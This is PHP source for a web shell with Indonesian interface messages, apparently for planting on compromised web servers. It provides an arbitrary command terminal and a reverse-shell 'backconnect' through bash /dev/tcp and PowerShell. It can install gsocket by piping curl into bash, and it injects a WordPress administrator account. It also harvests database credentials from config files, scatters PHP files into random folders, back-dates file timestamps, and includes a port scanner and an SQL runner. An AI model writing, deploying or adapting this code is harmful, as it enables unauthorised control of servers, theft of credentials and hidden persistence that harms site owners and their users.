<?php
set_time_limit(0);
ini_set('memory_limit', '512M');
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);
date_default_timezone_set('Asia/Jakarta');
session_start();

$clickablePath   = '/';
$currentDir      = '';
$dirQuery        = '';
$realPath        = '';
$dirSegments     = [];
$parentDirQuery  = '';
$specialOutput   = '';
$termOutput      = '';
$termCmd         = '';
$flash           = null;
$scanError       = '';
$items           = [];
$functionStatus  = [];
$whoami          = 'unknown';
$hostname        = '';
$diskInfo        = '';
$loadInfo        = 'N/A';
$sortBy          = 'name';
$sortOrder       = 'asc';

function encodePath($path) {
    if ($path === '') return '';
    return implode('/', array_map('rawurlencode', explode('/', $path)));
}

function getPublicIp() {
    if (isset($_SESSION['public_ip']) && (time() - ($_SESSION['public_ip_time'] ?? 0)) < 3600) {
        return $_SESSION['public_ip'];
    }
    $ip = '';
    $ctx = stream_context_create(['http' => ['timeout' => 3], 'https' => ['timeout' => 3]]);
    $sources = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ifconfig.me/ip'];
    foreach ($sources as $url) {
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $res = curl_exec($ch);
            curl_close($ch);
            if ($res && filter_var(trim($res), FILTER_VALIDATE_IP)) { $ip = trim($res); break; }
        } else {
            $res = @file_get_contents($url, false, $ctx);
            if ($res && filter_var(trim($res), FILTER_VALIDATE_IP)) { $ip = trim($res); break; }
        }
    }
    if (!$ip) $ip = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    $_SESSION['public_ip'] = $ip;
    $_SESSION['public_ip_time'] = time();
    return $ip;
}

function rmrf($dir) {
    if (!is_dir($dir)) return @unlink($dir);
    $items = @scandir($dir);
    if ($items) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            rmrf($dir . DIRECTORY_SEPARATOR . $item);
        }
    }
    return @rmdir($dir);
}

function zipRecursive($zip, $source, $pathInZip) {
    if (!is_dir($source)) return;
    $files = @scandir($source);
    if ($files) {
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $localPath = $source . DIRECTORY_SEPARATOR . $file;
            $zipPath = $pathInZip !== '' ? $pathInZip . '/' . $file : $file;
            if (is_dir($localPath)) {
                $zip->addEmptyDir($zipPath);
                zipRecursive($zip, $localPath, $zipPath);
            } else {
                $zip->addFile($localPath, $zipPath);
            }
        }
    }
}

function runCommand($cmd) {
    $execFunc = null;
    if (function_exists('shell_exec')) $execFunc = 'shell_exec';
    elseif (function_exists('exec')) $execFunc = 'exec';
    elseif (function_exists('system')) $execFunc = 'system';
    elseif (function_exists('passthru')) $execFunc = 'passthru';
    elseif (function_exists('popen')) $execFunc = 'popen';
    elseif (function_exists('proc_open')) $execFunc = 'proc_open';
    if ($execFunc === null) return "OS diblokir / Fungsi eksekusi dimatikan.";
    if ($execFunc === 'shell_exec') return shell_exec($cmd);
    elseif ($execFunc === 'exec') { $outArr = []; exec($cmd, $outArr); return implode("\n", $outArr); }
    elseif ($execFunc === 'system') { ob_start(); system($cmd); return ob_get_clean(); }
    elseif ($execFunc === 'passthru') { ob_start(); passthru($cmd); return ob_get_clean(); }
    elseif ($execFunc === 'popen') {
        if ($fp = popen($cmd, 'r')) { $out = ''; while (!feof($fp)) { $out .= fread($fp, 1024); } pclose($fp); return $out; }
    } elseif ($execFunc === 'proc_open') {
        $descriptorspec = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $out = stream_get_contents($pipes[1]);
            $out .= stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
            return $out;
        }
    }
    return "Error.";
}

function getRandomDirs($baseDir, $limit) {
    $dirs = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $dirs[] = $file->getPathname();
                if (count($dirs) >= $limit * 5) break;
            }
        }
    } catch (Exception $e) {}
    shuffle($dirs);
    return array_slice($dirs, 0, $limit);
}

function scanPorts($target, $start, $end) {
    $target = trim($target);
    if (empty($target)) return "Target IP/Domain kosong.";
    $ip = gethostbyname($target);
    if ($ip === $target && !filter_var($ip, FILTER_VALIDATE_IP)) return "Domain tidak valid / gagal resolve IP.";
    $start = max(1, (int)$start);
    $end = min(65535, (int)$end);
    if ($start > $end) return "Rentang port tidak valid (Awal > Akhir).";
    $startTime = microtime(true);
    $openPorts = 0;
    $output = "=== Port Scan: $ip ($start-$end) ===\n";
    for ($port = $start; $port <= $end; $port++) {
        $fp = @fsockopen($ip, $port, $errno, $errstr, 0.5);
        if ($fp) { $output .= "Port $port : OPEN\n"; $openPorts++; fclose($fp); }
    }
    $timeTaken = round(microtime(true) - $startTime, 2);
    if ($openPorts === 0) $output .= "Tidak ada port terbuka.\n";
    $output .= "Selesai dalam $timeTaken detik.";
    return $output;
}

function formatMtime($timestamp) {
    if (!$timestamp) return '-';
    $bulan = ['Jan','Feb','Mar','Apr','Mei','Jun','Jul','Agu','Sep','Okt','Nov','Des'];
    return date('d', $timestamp) . ' ' . $bulan[(int)date('n', $timestamp) - 1] . ' ' . date('Y H:i:s', $timestamp);
}

function getOwnerGroup($path) {
    $owner = '-';
    $group = '-';
    $uid = @fileowner($path);
    $gid = @filegroup($path);
    if ($uid !== false) {
        if (function_exists('posix_getpwuid')) {
            $pw = @posix_getpwuid($uid);
            $owner = $pw ? $pw['name'] : (string)$uid;
        } else {
            $owner = (string)$uid;
        }
    }
    if ($gid !== false) {
        if (function_exists('posix_getgrgid')) {
            $gr = @posix_getgrgid($gid);
            $group = $gr ? $gr['name'] : (string)$gid;
        } else {
            $group = (string)$gid;
        }
    }
    return $owner . ':' . $group;
}

function checkFunctions() {
    $funcs = [
        'exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec',
        'curl_init','curl_exec','file_get_contents','fopen','fwrite','fread',
        'mail','mysqli_connect','mysql_connect','fsockopen','stream_socket_client',
        'putenv','dl','chmod','chown','symlink','readlink','base64_decode','gzinflate',
        'posix_getpwuid','posix_geteuid'
    ];
    $result = [];
    foreach ($funcs as $f) {
        $result[$f] = function_exists($f) ? 'ENABLED' : 'DISABLED';
    }
    $result['eval'] = 'ALWAYS (language construct)';
    $result['assert'] = 'ALWAYS (language construct)';
    return $result;
}

function findDbCredentials($baseDir, $maxFiles = 300) {
    $results = [];
    $targets = ['wp-config.php','configuration.php','config.php','.env','database.php','settings.php','conn.php','koneksi.php','db.php','dbconfig.php','local.php','env.php'];
    $found = 0;
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($it as $file) {
            if ($found >= $maxFiles) break;
            if (!$file->isFile()) continue;
            if ($file->getSize() > 200000) continue;
            $name = strtolower($file->getFilename());
            $match = false;
            foreach ($targets as $p) { if ($name === $p) { $match = true; break; } }
            if (!$match) continue;
            $found++;
            $content = @file_get_contents($file->getPathname());
            if ($content === false) continue;
            $creds = [];
            if (preg_match_all("/define\s*\(\s*['\"]([A-Z0-9_]+)['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/", $content, $m, PREG_SET_ORDER)) {
                foreach ($m as $mm) {
                    $k = strtoupper($mm[1]);
                    if (strpos($k, 'DB_') === 0 || strpos($k, 'PASS') !== false || strpos($k, 'USER') !== false || strpos($k, 'HOST') !== false) {
                        $creds[$mm[1]] = $mm[2];
                    }
                }
            }
            if (preg_match_all("/^([A-Z0-9_]+)\s*=\s*['\"]?([^'\"\r\n]*)['\"]?\s*$/m", $content, $m, PREG_SET_ORDER)) {
                foreach ($m as $mm) {
                    $k = strtoupper($mm[1]);
                    if (!isset($creds[$mm[1]]) && (strpos($k, 'DB_') === 0 || strpos($k, 'PASS') !== false || strpos($k, 'USER') !== false || strpos($k, 'HOST') !== false)) {
                        $creds[$mm[1]] = $mm[2];
                    }
                }
            }
            if (!empty($creds)) {
                $relPath = str_replace($baseDir . DIRECTORY_SEPARATOR, '', $file->getPathname());
                $results[] = ['file' => $relPath, 'creds' => $creds];
            }
        }
    } catch (Exception $e) {}
    return $results;
}

function scanMalware($baseDir, $maxFiles = 500) {
    $suspicious = [];
    $patterns = [
        'eval\s*\(' => 'eval()',
        'assert\s*\(' => 'assert()',
        'base64_decode\s*\(' => 'base64_decode()',
        'gzinflate\s*\(' => 'gzinflate()',
        'gzuncompress\s*\(' => 'gzuncompress()',
        'str_rot13\s*\(' => 'str_rot13()',
        'preg_replace\s*\([^)]*\/e[^)]*\)' => 'preg_replace /e',
        'shell_exec\s*\(' => 'shell_exec()',
        'passthru\s*\(' => 'passthru()',
        'system\s*\(' => 'system()',
        'popen\s*\(' => 'popen()',
        'proc_open\s*\(' => 'proc_open()',
        '\$_POST\s*\[' => '$_POST[...]',
        '\$_REQUEST\s*\[' => '$_REQUEST[...]',
        'fsockopen\s*\(' => 'fsockopen()',
        'stream_socket_client\s*\(' => 'stream_socket_client()',
        'move_uploaded_file\s*\(' => 'move_uploaded_file()',
        'file_put_contents\s*\(' => 'file_put_contents()',
        'symlink\s*\(' => 'symlink()',
    ];
    $count = 0;
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($it as $file) {
            if ($count >= $maxFiles) break;
            if (!$file->isFile()) continue;
            $ext = strtolower(pathinfo($file->getFilename(), PATHINFO_EXTENSION));
            if (!in_array($ext, ['php','phtml','php3','php4','php5','php7','php8','inc','tpl','shtml'])) continue;
            if ($file->getSize() > 500000) continue;
            $count++;
            $content = @file_get_contents($file->getPathname());
            if ($content === false) continue;
            $matches = [];
            foreach ($patterns as $pat => $label) {
                if (preg_match('/' . $pat . '/i', $content, $mm)) {
                    $matches[$label] = isset($matches[$label]) ? $matches[$label] + 1 : 1;
                }
            }
            if (!empty($matches)) {
                $relPath = str_replace($baseDir . DIRECTORY_SEPARATOR, '', $file->getPathname());
                $suspicious[] = ['file' => $relPath, 'matches' => $matches];
            }
        }
    } catch (Exception $e) {}
    return $suspicious;
}

$publicIp = getPublicIp();
$domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'Unknown';
$osInfo = php_uname('s') . ' ' . php_uname('r');
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? (php_sapi_name() . ' / ' . php_uname('m'));

$isWin = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$baseDir = __DIR__;

if (!@is_dir($baseDir)) die('Gagal mengakses folder base.');
$baseDirReal = realpath($baseDir);
if ($baseDirReal === false || !is_readable($baseDirReal)) die('Folder tidak terbaca.');
$baseDir = $baseDirReal;

if (!isset($_GET['dir']) && !isset($_GET['action'])) {
    $scriptDir = str_replace('\\', '/', __DIR__);
    if ($isWin) $scriptDir = preg_replace('#^[a-zA-Z]:/#', '', $scriptDir);
    else $scriptDir = ltrim($scriptDir, '/');
    header('Location: ?dir=' . encodePath($scriptDir));
    exit;
}

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

function formatSize($b) {
    if ($b < 1024)       return $b . ' B';
    if ($b < 1048576)    return round($b / 1024, 1) . ' KB';
    if ($b < 1073741824) return round($b / 1048576, 2) . ' MB';
    return round($b / 1073741824, 2) . ' GB';
}

function validateName($name) {
    $name = trim($name);
    if ($name === '') throw new Exception('Nama tidak boleh kosong');
    if ($name === '.' || $name === '..') throw new Exception('Nama tidak valid');
    if (preg_match('#[/\\\\\x00]#', $name)) throw new Exception('Nama tidak valid');
    return $name;
}

// ==========================================
// SMART PATH RESOLVER
// ==========================================
$rawDirGet  = $_GET['dir'] ?? '';
$currentDir = str_replace('\\', '/', $rawDirGet);
$currentDir = preg_replace('#/+#', '/', $currentDir);

$isAbsolute = false;

if (strpos($currentDir, '/') === 0 || ($isWin && preg_match('#^[a-zA-Z]:/#', $currentDir))) {
    $realPath = realpath($currentDir);
    if ($realPath !== false && is_dir($realPath)) {
        $isAbsolute = true;
    }
}

if (!$isAbsolute) {
    $currentDirRel = trim($currentDir, '/');
    $dirSegments = [];
    if ($currentDirRel !== '') {
        foreach (explode('/', $currentDirRel) as $seg) {
            if ($seg === '' || $seg === '.' || $seg === '..') { $currentDirRel = ''; $dirSegments = []; break; }
            $dirSegments[] = $seg;
        }
    }
    
    $tryPath = $baseDir;
    if (!empty($dirSegments)) $tryPath .= DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $dirSegments);
    $realPath = realpath($tryPath);

    if ($realPath === false && !$isWin && is_dir('/' . $currentDirRel)) {
        $realPath = realpath('/' . $currentDirRel);
        $isAbsolute = true;
    }
}

if ($realPath === false || !is_dir($realPath)) {
    $realPath = $baseDir;
    $currentDir = trim(str_replace($baseDirReal, '', $realPath), '/');
    $isAbsolute = false;
} else {
    if ($isAbsolute) {
        $currentDir = trim(str_replace('\\', '/', $realPath), '/');
    } else {
        $currentDir = ltrim(str_replace('\\', '/', $realPath), '/');
    }
}

$dirSegments = $currentDir === '' ? [] : explode('/', $currentDir);
$dirQuery = $currentDir !== '' ? 'dir=' . encodePath(($isAbsolute ? '/' : '') . $currentDir) : '';

$tempPath = str_replace('\\', '/', $realPath);
$pathParts = [];
$acc = '';

if ($isWin) {
    $parts = explode('/', $tempPath);
    $drive = array_shift($parts);
    $pathParts[] = '<a href="?dir=">' . h($drive) . '</a>';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $acc = $acc === '' ? $part : $acc . '/' . $part;
        $pathParts[] = '<a href="?dir=' . encodePath($acc) . '">' . h($part) . '</a>';
    }
    $clickablePath = implode('<span class="path-sep">/</span>', $pathParts) . '<span class="path-sep">/</span>';
} else {
    $parts = explode('/', trim($tempPath, '/'));
    $pathParts[] = '<a href="?dir=">/</a>';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $acc = $acc === '' ? $part : $acc . '/' . $part;
        $pathParts[] = '<a href="?dir=' . encodePath($acc) . '">' . h($part) . '</a>';
    }
    $clickablePath = array_shift($pathParts);
    if (!empty($pathParts)) $clickablePath .= implode('<span class="path-sep">/</span>', $pathParts);
}

if (isset($_GET['download']) && $_GET['download'] !== '') {
    $fn = $_GET['download'];
    if (strpos($fn, '..') === false && !preg_match('#[/\\\\\x00]#', $fn)) {
        $target = $realPath . DIRECTORY_SEPARATOR . $fn;
        if (is_file($target) && is_readable($target)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($fn) . '"');
            header('Content-Length: ' . filesize($target));
            header('Cache-Control: no-cache');
            readfile($target);
            exit;
        }
    }
    http_response_code(404);
    echo 'File not found';
    exit;
}

if (isset($_GET['ajax']) && $_GET['ajax'] === 'get_file' && isset($_GET['file'])) {
    $fn = $_GET['file'];
    if ($fn !== '' && strpos($fn, '..') === false && !preg_match('#[/\\\\\x00]#', $fn)) {
        $target = $realPath . DIRECTORY_SEPARATOR . $fn;
        if (is_file($target)) {
            header('Content-Type: application/json');
            echo json_encode(['content' => file_get_contents($target)]);
            exit;
        }
    }
    header('HTTP/1.1 404 Not Found'); echo json_encode(['error' => 'File not found']); exit;
}

if (isset($_GET['ajax']) && $_GET['ajax'] === 'folder_size' && isset($_GET['folder'])) {
    $fn = $_GET['folder'];
    if ($fn !== '' && strpos($fn, '..') === false && !preg_match('#[/\\\\\x00]#', $fn)) {
        $target = $realPath . DIRECTORY_SEPARATOR . $fn;
        if (is_dir($target)) {
            $total = 0; $countFiles = 0;
            try {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($it as $file) {
                    if ($file->isFile()) { $total += $file->getSize(); $countFiles++; }
                }
            } catch (Exception $e) {}
            header('Content-Type: application/json');
            echo json_encode(['size' => $total, 'size_h' => formatSize($total), 'files' => $countFiles]);
            exit;
        }
    }
    header('HTTP/1.1 404 Not Found'); echo json_encode(['error' => 'Folder not found']); exit;
}

if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $pw = @posix_getpwuid(posix_geteuid());
    if ($pw) $whoami = $pw['name'];
} elseif (function_exists('get_current_user')) {
    $whoami = get_current_user();
}
$hostname = @gethostname() ?: (php_uname('n') ?: 'unknown');
$diskFree = @disk_free_space($baseDir);
$diskTotal = @disk_total_space($baseDir);
if ($diskFree !== false && $diskTotal !== false && $diskTotal > 0) {
    $usedPct = round((($diskTotal - $diskFree) / $diskTotal) * 100, 1);
    $diskInfo = formatSize($diskFree) . ' free / ' . formatSize($diskTotal) . ' (' . $usedPct . '% used)';
}
if (function_exists('sys_getloadavg')) {
    $load = @sys_getloadavg();
    if ($load) $loadInfo = round($load[0],2) . ', ' . round($load[1],2) . ', ' . round($load[2],2);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $act = $_POST['action'] ?? '';
    if ($act === 'install_gsocket') {
        $cmd = 'cd ' . escapeshellarg($realPath) . ' && bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
        if (strpos(@shell_exec('which curl'), 'curl') === false) {
            $cmd = 'cd ' . escapeshellarg($realPath) . ' && wget -qO- https://gsocket.io/y | bash 2>&1';
        }
        $specialOutput = "=== Gsocket Install ===\n" . runCommand($cmd);
    } elseif ($act === 'backconnect') {
        $ip = $_POST['bc_ip'] ?? ''; $port = $_POST['bc_port'] ?? '';
        if (empty($ip) || empty($port)) { $specialOutput = "IP dan Port wajib diisi!"; }
        else {
            $cmd = "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1";
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                $cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('{$ip}',{$port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"";
            }
            $specialOutput = "=== Backconnect Executed ===\n" . runCommand($cmd);
        }
    } elseif ($act === 'add_wp_user') {
        $user = trim($_POST['wp_user'] ?? ''); $pass = trim($_POST['wp_pass'] ?? '');
        if (empty($user) || empty($pass)) { $specialOutput = "Username dan Password wajib diisi!"; }
        else {
            $wpConfig = $realPath . '/wp-config.php';
            if (!file_exists($wpConfig)) $wpConfig = dirname($realPath) . '/wp-config.php';
            if (file_exists($wpConfig)) {
                $content = file_get_contents($wpConfig);
                preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $mName);
                preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $mUser);
                preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $mPass);
                preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $mHost);
                preg_match("/\\\$table_prefix\s*=\s*['\"](.*?)['\"]/", $content, $mPrefix);
                if (!empty($mName[1]) && !empty($mUser[1])) {
                    $dbName = $mName[1]; $dbUser = $mUser[1]; $dbPass = $mPass[1] ?? ''; $dbHost = $mHost[1] ?? 'localhost'; $prefix = $mPrefix[1] ?? 'wp_';
                    try {
                        $pdo = new PDO("mysql:host={$dbHost};dbname={$dbName}", $dbUser, $dbPass);
                        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                        $hash = password_hash($pass, PASSWORD_BCRYPT);
                        $stmt = $pdo->prepare("INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, NOW(), 0, ?)");
                        $stmt->execute([$user, $hash, $user.'@'.$domain, $user]);
                        $uid = $pdo->lastInsertId();
                        $stmt = $pdo->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
                        $stmt->execute([$uid]);
                        $specialOutput = "=== WP User Added ===\nSukses! User '{$user}' dengan password '{$pass}' berhasil ditambahkan sebagai Administrator.";
                    } catch (PDOException $e) { $specialOutput = "Gagal koneksi ke database WP: " . $e->getMessage(); }
                } else { $specialOutput = "Gagal parsing wp-config.php."; }
            } else { $specialOutput = "File wp-config.php tidak ditemukan."; }
        }
    } elseif ($act === 'scan_recent') {
        $limit = 15; $results = [];
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($realPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($iterator as $file) {
            if ($file->isFile()) $results[] = ['path' => $file->getPathname(), 'mtime' => $file->getMTime()];
        }
        usort($results, function($a, $b) { return $b['mtime'] - $a['mtime']; });
        $results = array_slice($results, 0, $limit);
        $specialOutput = "=== 15 File Terakhir Diubah ===\n";
        foreach ($results as $r) {
            $specialOutput .= "[" . formatMtime($r['mtime']) . "] " . str_replace($realPath . DIRECTORY_SEPARATOR, '', $r['path']) . "\n";
        }
    } elseif ($act === 'spread_file') {
        $count = (int)($_POST['spread_count'] ?? 1);
        if ($count < 1) $count = 1;
        if ($count > 100) $count = 100;
        $customName = trim($_POST['spread_name'] ?? '');
        $fileContent = "<?php echo 'Spread By 0x1998'; ?>";
        $dirs = getRandomDirs($realPath, $count);
        $success = 0;
        foreach ($dirs as $dir) {
            if ($customName !== '') $fileName = validateName($customName);
            else $fileName = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 8) . ".php";
            $target = $dir . DIRECTORY_SEPARATOR . $fileName;
            if (@file_put_contents($target, $fileContent) !== false) $success++;
        }
        if ($success > 0) $specialOutput = "=== Spreader Done ===\nBerhasil menyebarkan file ke $success folder.";
        else $specialOutput = "=== Spreader Failed ===\nGagal menyebarkan file.";
    } elseif ($act === 'port_scan') {
        $target = trim($_POST['scan_target'] ?? ''); $start = trim($_POST['scan_start'] ?? '1'); $end = trim($_POST['scan_end'] ?? '1000');
        if (empty($target)) $specialOutput = "Target IP/Domain wajib diisi!";
        else $specialOutput = scanPorts($target, $start, $end);
    } elseif ($act === 'touch_all') {
        $touchTime = $_POST['touch_time'] ?? ''; $recursive = !empty($_POST['recursive']);
        if (empty($touchTime)) { $specialOutput = "Waktu wajib diisi!"; }
        else {
            $timestamp = strtotime($touchTime);
            if ($timestamp === false) { $specialOutput = "Format waktu tidak valid!"; }
            else {
                $count = 0; $scopeLabel = $recursive ? 'recursive' : 'hanya folder ini';
                try {
                    if ($recursive) {
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($realPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($it as $file) { if (@touch($file->getPathname(), $timestamp)) $count++; }
                    } else {
                        $scanItems = @scandir($realPath);
                        if ($scanItems) {
                            foreach ($scanItems as $item) {
                                if ($item === '.' || $item === '..') continue;
                                if (@touch($realPath . DIRECTORY_SEPARATOR . $item, $timestamp)) $count++;
                            }
                        }
                    }
                } catch (Exception $e) {}
                $specialOutput = "=== Touch All ($scopeLabel) ===\nBerhasil touch $count item ke " . formatMtime($timestamp);
            }
        }
    } elseif ($act === 'sql_run') {
        $host = trim($_POST['sql_host'] ?? 'localhost'); $user = trim($_POST['sql_user'] ?? '');
        $pass = $_POST['sql_pass'] ?? ''; $db = trim($_POST['sql_db'] ?? ''); $query = trim($_POST['sql_query'] ?? '');
        if (empty($user) || empty($query)) { $specialOutput = "User dan query wajib diisi!"; }
        else {
            try {
                $dsn = "mysql:host=$host;charset=utf8mb4" . ($db !== '' ? ";dbname=$db" : '');
                $pdo = new PDO($dsn, $user, $pass);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $stmt = $pdo->query($query);
                if ($stmt === false) { $specialOutput = "Query tidak mengembalikan hasil."; }
                else {
                    $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    if (empty($rows)) { $specialOutput = "=== SQL Result ===\nQuery berhasil, tidak ada baris dikembalikan."; }
                    else {
                        $specialOutput = "=== SQL Result (" . count($rows) . " rows) ===\n";
                        $headers = array_keys($rows[0]);
                        $specialOutput .= implode(" | ", $headers) . "\n" . str_repeat("-", 60) . "\n";
                        foreach (array_slice($rows, 0, 100) as $row) {
                            $vals = [];
                            foreach ($headers as $hh) $vals[] = $row[$hh] ?? 'NULL';
                            $specialOutput .= implode(" | ", $vals) . "\n";
                        }
                        if (count($rows) > 100) $specialOutput .= "... (" . (count($rows) - 100) . " more rows)\n";
                    }
                }
            } catch (PDOException $e) { $specialOutput = "SQL Error: " . $e->getMessage(); }
        }
    } elseif ($act === 'db_creds') {
        $found = findDbCredentials($realPath, 300);
        $specialOutput = "=== DB Credentials Finder ===\n";
        if (empty($found)) { $specialOutput .= "Tidak ditemukan file config dengan credential DB.\n"; }
        else {
            $specialOutput .= "Ditemukan " . count($found) . " file:\n\n";
            foreach ($found as $r) {
                $specialOutput .= "📄 " . $r['file'] . "\n";
                foreach ($r['creds'] as $k => $v) { $specialOutput .= "   $k = $v\n"; }
                $specialOutput .= "\n";
            }
        }
    } elseif ($act === 'malware_scan') {
        $found = scanMalware($realPath, 500);
        $specialOutput = "=== Malware Scanner ===\n";
        if (empty($found)) { $specialOutput .= "Tidak ada indikasi mencurigakan di 500 file PHP pertama.\n"; }
        else {
            $specialOutput .= "Ditemukan " . count($found) . " file mencurigakan:\n\n";
            foreach ($found as $r) {
                $specialOutput .= "⚠ " . $r['file'] . "\n";
                foreach ($r['matches'] as $pat => $n) { $specialOutput .= "   - $pat x$n\n"; }
                $specialOutput .= "\n";
            }
        }
    }
}

$termCmd = $_POST['command'] ?? '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'terminal') {
    $cmdStr = trim($termCmd);
    if ($cmdStr !== '') $termOutput = runCommand('cd ' . escapeshellarg($realPath) . ' && ' . $cmdStr . ' 2>&1');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'download_url') {
    $url = trim($_POST['url'] ?? ''); $saveName = trim($_POST['save_as'] ?? '');
    if (empty($url)) { $_SESSION['flash'] = ['type' => 'error', 'msg' => 'URL kosong']; }
    else {
        if (empty($saveName)) $saveName = basename(parse_url($url, PHP_URL_PATH));
        try {
            $saveName = validateName($saveName);
            $target = $realPath . DIRECTORY_SEPARATOR . $saveName;
            if (function_exists('curl_init')) {
                $ch = curl_init($url); $fp = fopen($target, 'wb');
                curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $success = curl_exec($ch); curl_close($ch); fclose($fp);
                if ($success) $_SESSION['flash'] = ['type' => 'success', 'msg' => "Download $saveName sukses"];
                else { @unlink($target); $_SESSION['flash'] = ['type' => 'error', 'msg' => 'Gagal download (cURL)']; }
            } else {
                $data = @file_get_contents($url);
                if ($data !== false) {
                    if (file_put_contents($target, $data) !== false) $_SESSION['flash'] = ['type' => 'success', 'msg' => "Download $saveName sukses"];
                    else $_SESSION['flash'] = ['type' => 'error', 'msg' => 'Gagal simpan file'];
                } else $_SESSION['flash'] = ['type' => 'error', 'msg' => 'Gagal download'];
            }
        } catch (Exception $e) { $_SESSION['flash'] = ['type' => 'error', 'msg' => $e->getMessage()]; }
    }
    header('Location: ?' . $dirQuery); exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !in_array(($_POST['action'] ?? ''), ['terminal', 'download_url', 'install_gsocket', 'backconnect', 'add_wp_user', 'scan_recent', 'spread_file', 'port_scan', 'touch_all', 'sql_run', 'db_creds', 'malware_scan'])) {
    $postAction = $_POST['action'] ?? '';
    $message    = '';
    $error      = '';
    $redirect   = '?' . $dirQuery;
    try {
        if ($postAction === 'create') {
            $type   = $_POST['type'] ?? 'file';
            $name   = validateName($_POST['name'] ?? '');
            $target = $realPath . DIRECTORY_SEPARATOR . $name;
            if (file_exists($target)) throw new Exception('Sudah ada');
            if ($type === 'dir') {
                if (!mkdir($target, 0755)) throw new Exception('Gagal buat folder');
                $message = "Folder $name dibuat";
            } else {
                if (file_put_contents($target, '') === false) throw new Exception('Gagal buat file');
                $message = "File $name dibuat";
            }
        } elseif ($postAction === 'rename') {
            $oldName = $_POST['old_name'] ?? ''; $newName = validateName($_POST['new_name'] ?? '');
            if (strpos($oldName, '..') !== false || preg_match('#[/\\\\\x00]#', $oldName)) throw new Exception('Nama lama salah');
            $old = $realPath . DIRECTORY_SEPARATOR . $oldName;
            $new = $realPath . DIRECTORY_SEPARATOR . $newName;
            if (!file_exists($old))  throw new Exception('Tidak ada');
            if (file_exists($new))   throw new Exception('Nama dipakai');
            if (!rename($old, $new)) throw new Exception('Gagal rename');
